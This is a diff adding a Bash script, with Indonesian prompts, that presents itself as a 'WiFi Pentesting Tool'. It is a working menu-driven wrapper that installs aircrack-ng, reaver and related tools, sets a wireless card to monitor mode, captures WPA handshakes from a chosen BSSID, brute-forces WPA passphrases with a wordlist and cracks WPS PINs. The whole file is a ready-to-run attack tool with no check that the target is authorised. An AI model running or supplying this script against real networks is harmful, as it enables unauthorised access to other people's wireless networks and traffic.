@@ -1,0 +1,190 @@
+#!/bin/bash
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Banner
+show_banner() {
+    clear
+    echo -e "${GREEN}"
+    echo "╔══════════════════════════════════════╗"
+    echo "║          WiFi Pentesting Tool        ║"
+    echo "║              Debian Terminal         ║"
+    echo "╚══════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+# Check if run as root
+check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
+        echo "Gunakan: sudo ./wifi_tool.sh"
+        exit 1
+    fi
+}
+
+# Install requirements
+install_requirements() {
+    echo -e "${YELLOW}[*] Menginstall requirements...${NC}"
+    
+    apt update
+    apt install -y aircrack-ng \
+                   reaver \
+                   bully \
+                   hashcat \
+                   hcxdumptool \
+                   hcxtools \
+                   wireshark \
+                   tshark \
+                   macchanger \
+                   cowpatty \
+                   pixiewps
+    
+    echo -e "${GREEN}[+] Semua requirements terinstall!${NC}"
+    sleep 2
+}
+
+# Scan WiFi networks
+scan_wifi() {
+    echo -e "${YELLOW}[*] Mencari interface WiFi...${NC}"
+    
+    # Find wireless interfaces
+    interfaces=$(iwconfig 2>/dev/null | grep -o "^[[:alnum:]]*")
+    
+    if [[ -z "$interfaces" ]]; then
+        echo -e "${RED}[!] Tidak ada interface WiFi ditemukan!${NC}"
+        return 1
+    fi
+    
+    echo -e "${BLUE}[+] Interface WiFi ditemukan:${NC}"
+    select interface in $interfaces; do
+        if [[ -n "$interface" ]]; then
+            selected_interface=$interface
+            break
+        fi
+    done
+    
+    echo -e "${YELLOW}[*] Menghentikan proses yang mengganggu...${NC}"
+    airmon-ng check kill
+    
+    echo -e "${YELLOW}[*] Memulai monitor mode pada $selected_interface...${NC}"
+    airmon-ng start $selected_interface
+    
+    monitor_interface="${selected_interface}mon"
+    
+    echo -e "${GREEN}[*] Memindai jaringan WiFi (Ctrl+C untuk berhenti)...${NC}"
+    airodump-ng $monitor_interface
+}
+
+# Capture handshake
+capture_handshake() {
+    echo -e "${YELLOW}[*] Mode Capture Handshake${NC}"
+    
+    read -p "Masukkan BSSID target: " bssid
+    read -p "Masukkan channel target: " channel
+    read -p "Nama file output (tanpa ekstensi): " output_file
+    
+    interface=$(iwconfig 2>/dev/null | grep "mon" | cut -d' ' -f1 | head -1)
+    
+    if [[ -z "$interface" ]]; then
+        echo -e "${RED}[!] Tidak ada interface monitor mode ditemukan!${NC}"
+        return 1
+    fi
+    
+    echo -e "${GREEN}[*] Menangkap handshake pada BSSID: $bssid${NC}"
+    echo -e "${YELLOW}[*] Tekan Ctrl+C ketika mendapatkan handshake${NC}"
+    
+    airodump-ng -c $channel --bssid $bssid -w $output_file $interface
+}
+
+# WPA bruteforce
+wpa_bruteforce() {
+    echo -e "${YELLOW}[*] Mode Bruteforce WPA${NC}"
+    
+    read -p "Masukkan path file handshake (.cap): " cap_file
+    read -p "Masukkan path wordlist: " wordlist
+    
+    if [[ ! -f "$cap_file" ]]; then
+        echo -e "${RED}[!] File $cap_file tidak ditemukan!${NC}"
+        return 1
+    fi
+    
+    if [[ ! -f "$wordlist" ]]; then
+        echo -e "${RED}[!] File wordlist $wordlist tidak ditemukan!${NC}"
+        return 1
+    fi
+    
+    echo -e "${GREEN}[*] Memulai bruteforce WPA...${NC}"
+    aircrack-ng -w "$wordlist" "$cap_file"
+}
+
+# WPS crack
+wps_crack() {
+    echo -e "${YELLOW}[*] Mode Crack WPS${NC}"
+    
+    read -p "Masukkan BSSID target: " bssid
+    read -p "Masukkan channel target: " channel
+    
+    interface=$(iwconfig 2>/dev/null | grep -o "^[[:alnum:]]*" | head -1)
+    
+    echo -e "${GREEN}[*] Memulai WPS crack dengan reaver...${NC}"
+    reaver -i $interface -b $bssid -c $channel -vv
+    
+    echo -e "${YELLOW}[*] Atau mencoba dengan bully...${NC}"
+    bully -b $bssid -c $channel $interface
+}
+
+# Main menu
+main_menu() {
+    while true; do
+        show_banner
+        echo -e "${BLUE}Pilih opsi:${NC}"
+        echo "1. Install Requirements"
+        echo "2. Scan WiFi Networks"
+        echo "3. Capture Handshake"
+        echo "4. WPA Bruteforce"
+        echo "5. WPS Crack PIN"
+        echo "6. Exit"
+        echo
+        
+        read -p "Pilihan [1-6]: " choice
+        
+        case $choice in
+            1)
+                install_requirements
+                ;;
+            2)
+                scan_wifi
+                ;;
+            3)
+                capture_handshake
+                ;;
+            4)
+                wpa_bruteforce
+                ;;
+            5)
+                wps_crack
+                ;;
+            6)
+                echo -e "${GREEN}[+] Keluar...${NC}"
+                # Restart network services
+                service network-manager restart
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}[!] Pilihan tidak valid!${NC}"
+                ;;
+        esac
+        
+        echo
+        read -p "Tekan Enter untuk melanjutkan..."
+    done
+}
+
+# Check root and start
+check_root
+main_menu
